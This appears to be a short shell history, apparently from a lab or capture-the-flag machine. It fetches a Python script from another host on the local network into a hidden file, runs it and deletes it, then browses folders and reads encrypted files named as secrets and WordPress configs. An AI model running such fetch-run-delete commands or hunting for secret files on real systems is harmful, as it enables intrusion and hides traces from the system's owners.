curl http://192.168.1.38/clev.py > .s.py
curl http://192.168.1.38:8080/clev.py > .s.py
curl http://192.168.1.38:8888/clev.py > .s.py
curl http://192.168.1.38:1111/clev.py > .s.py
file .s.py
python3.7 .s.py 
rm .s.py 
exit
ls
cat message 
cd data/
ls
cat secrets.txt.enc 
cd ..
ls
cd wp_configs/
ls
cat text.txt.enc 
cd ..
ls
ls -la
exit
